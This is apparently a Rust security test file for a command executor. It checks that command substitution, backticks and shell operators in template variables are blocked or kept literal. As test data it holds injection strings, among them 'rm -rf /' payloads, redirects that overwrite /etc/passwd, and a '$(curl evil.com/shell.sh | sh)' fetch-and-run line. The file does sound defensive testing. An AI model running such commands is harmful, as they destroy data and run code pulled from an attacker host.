//! Security tests for String command mode
//!
//! These tests validate the security properties of StringCommandSpec:
//! - Command substitution blocking ($(..)) and backticks
//! - Shell operator injection prevention
//! - Quote escape security
//! - Parser boundary testing to prevent injection

use cupcake::config::actions::{CommandSpec, StringCommandSpec};
use cupcake::engine::command_executor::CommandExecutor;
use std::collections::HashMap;

/// Test that command substitution with $(...) is blocked
#[test]
fn test_command_substitution_blocked() {
    let executor = CommandExecutor::new(HashMap::new());
    
    let spec = CommandSpec::String(StringCommandSpec {
        command: "echo $(whoami)".to_string(),
    });
    
    let result = executor.build_graph(&spec);
    
    // Should fail with specific error about command substitution
    assert!(result.is_err());
    let error = result.unwrap_err();
    assert!(error.to_string().contains("Command substitution"));
}

/// Test that backtick command substitution is blocked
#[test]
fn test_backtick_substitution_blocked() {
    let executor = CommandExecutor::new(HashMap::new());
    
    let spec = CommandSpec::String(StringCommandSpec {
        command: "echo `whoami`".to_string(),
    });
    
    let result = executor.build_graph(&spec);
    
    // Should fail with specific error about backticks
    assert!(result.is_err());
    let error = result.unwrap_err();
    assert!(error.to_string().contains("Backtick"));
}

/// Test that nested command substitution attempts are blocked
#[test]
fn test_nested_command_substitution_blocked() {
    let executor = CommandExecutor::new(HashMap::new());
    
    let test_cases = vec![
        "echo $(cat $(echo /etc/passwd))",
        "echo $(echo `whoami`)",
        "echo `echo $(whoami)`",
        "echo $(echo \\$(whoami))",
    ];
    
    for malicious_cmd in test_cases {
        let spec = CommandSpec::String(StringCommandSpec {
            command: malicious_cmd.to_string(),
        });
        
        let result = executor.build_graph(&spec);
        assert!(result.is_err(), "Should block: {}", malicious_cmd);
    }
}

/// Test that shell operator injection through templates is prevented
#[test]
fn test_shell_operator_injection_prevention() {
    let mut vars = HashMap::new();
    vars.insert("malicious_arg".to_string(), "arg; rm -rf /".to_string());
    vars.insert("pipe_attack".to_string(), "| rm -rf /".to_string());
    vars.insert("redirect_attack".to_string(), "> /etc/passwd".to_string());
    
    let executor = CommandExecutor::new(vars);
    
    let spec = CommandSpec::String(StringCommandSpec {
        command: "echo {{malicious_arg}} {{pipe_attack}} {{redirect_attack}}".to_string(),
    });
    
    let graph = executor.build_graph(&spec).unwrap();
    let node = &graph.nodes[0];
    
    // Shell operators in templates become literal arguments
    assert_eq!(node.command.program, "echo");
    assert_eq!(node.command.args, vec![
        "arg; rm -rf /",
        "| rm -rf /", 
        "> /etc/passwd"
    ]);
}

/// Test that quote escape attempts are handled safely
#[test]
fn test_quote_escape_security() {
    let mut vars = HashMap::new();
    vars.insert("escape_attempt".to_string(), "'; rm -rf /; echo '".to_string());
    vars.insert("double_escape".to_string(), "\"; rm -rf /; echo \"".to_string());
    
    let executor = CommandExecutor::new(vars);
    
    let spec = CommandSpec::String(StringCommandSpec {
        command: "echo '{{escape_attempt}}' \"{{double_escape}}\"".to_string(),
    });
    
    let graph = executor.build_graph(&spec).unwrap();
    let node = &graph.nodes[0];
    
    // Quote escapes become literal content within quotes
    assert_eq!(node.command.program, "echo");
    assert_eq!(node.command.args, vec![
        "'; rm -rf /; echo '",
        "\"; rm -rf /; echo \""
    ]);
}

/// Test that complex shell injection attempts are neutralized
#[test]
fn test_complex_shell_injection_neutralization() {
    let mut vars = HashMap::new();
    vars.insert("complex_attack".to_string(), "$(curl evil.com/shell.sh | sh)".to_string());
    
    let executor = CommandExecutor::new(vars);
    
    let spec = CommandSpec::String(StringCommandSpec {
        command: "echo {{complex_attack}}".to_string(),
    });
    
    let graph = executor.build_graph(&spec).unwrap();
    let node = &graph.nodes[0];
    
    // Complex attack becomes literal argument
    assert_eq!(node.command.program, "echo");
    assert_eq!(node.command.args, vec!["$(curl evil.com/shell.sh | sh)"]);
}

/// Test that parser boundary conditions are secure
#[test]
fn test_parser_boundary_security() {
    let executor = CommandExecutor::new(HashMap::new());
    
    // Test various boundary conditions that could confuse the parser
    let boundary_tests = vec![
        ("", true),  // Empty string should fail
        ("   ", true),  // Whitespace only should fail  
        ("echo", false),  // Simple command should pass
        ("echo 'test", true),  // Unmatched quote should fail
        ("echo test'", true),  // Trailing quote should fail (unmatched)
        ("echo | ", true),  // Trailing pipe should fail
        ("echo && ", true),  // Trailing operator should fail
        ("echo ||", true),  // Trailing operator should fail
    ];
    
    for (test_cmd, should_fail) in boundary_tests {
        let spec = CommandSpec::String(StringCommandSpec {
            command: test_cmd.to_string(),
        });
        
        let result = executor.build_graph(&spec);
        
        if should_fail {
            assert!(result.is_err(), "Should fail: '{}'", test_cmd);
        } else {
            assert!(result.is_ok(), "Should pass: '{}'", test_cmd);
        }
    }
}

/// Test that environment variable expansion is safe
#[test]
fn test_environment_variable_expansion_security() {
    let mut vars = HashMap::new();
    vars.insert("safe_var".to_string(), "hello".to_string());
    vars.insert("malicious_var".to_string(), "$(rm -rf /)".to_string());
    
    let executor = CommandExecutor::new(vars);
    
    let spec = CommandSpec::String(StringCommandSpec {
        command: "echo ${{safe_var}} ${{malicious_var}}".to_string(),
    });
    
    let graph = executor.build_graph(&spec).unwrap();
    let node = &graph.nodes[0];
    
    // Environment variables are substituted but content is literal
    assert_eq!(node.command.program, "echo");
    assert_eq!(node.command.args, vec!["$hello", "$$(rm -rf /)"]);
}

/// Test that redirect injection through templates is prevented
#[test]
fn test_redirect_injection_prevention() {
    let mut vars = HashMap::new();
    vars.insert("malicious_file".to_string(), "/etc/passwd; rm -rf /".to_string());
    
    let executor = CommandExecutor::new(vars);
    
    let spec = CommandSpec::String(StringCommandSpec {
        command: "echo test > {{malicious_file}}".to_string(),
    });
    
    let graph = executor.build_graph(&spec).unwrap();
    let node = &graph.nodes[0];
    
    // Should parse as redirect operation with literal filename
    assert_eq!(node.command.program, "echo");
    assert_eq!(node.command.args, vec!["test"]);
    
    // Check that redirect operation uses template variable (not yet substituted)
    assert_eq!(node.operations.len(), 1);
    if let cupcake::engine::command_executor::Operation::RedirectStdout(path) = &node.operations[0] {
        assert_eq!(path.to_string_lossy(), "{{malicious_file}}");
    } else {
        panic!("Expected redirect operation");
    }
}

/// Test that pipe injection through templates is prevented
#[test]
fn test_pipe_injection_prevention() {
    let mut vars = HashMap::new();
    vars.insert("malicious_grep".to_string(), "test; rm -rf /".to_string());
    
    let executor = CommandExecutor::new(vars);
    
    let spec = CommandSpec::String(StringCommandSpec {
        command: "echo hello | grep {{malicious_grep}}".to_string(),
    });
    
    let graph = executor.build_graph(&spec).unwrap();
    let node = &graph.nodes[0];
    
    // Should parse as pipe operation with literal argument
    assert_eq!(node.command.program, "echo");
    assert_eq!(node.command.args, vec!["hello"]);
    
    // Check that pipe operation uses literal argument
    assert_eq!(node.operations.len(), 1);
    if let cupcake::engine::command_executor::Operation::Pipe(cmd) = &node.operations[0] {
        assert_eq!(cmd.program, "grep");
        assert_eq!(cmd.args, vec!["test; rm -rf /"]);
    } else {
        panic!("Expected pipe operation");
    }
}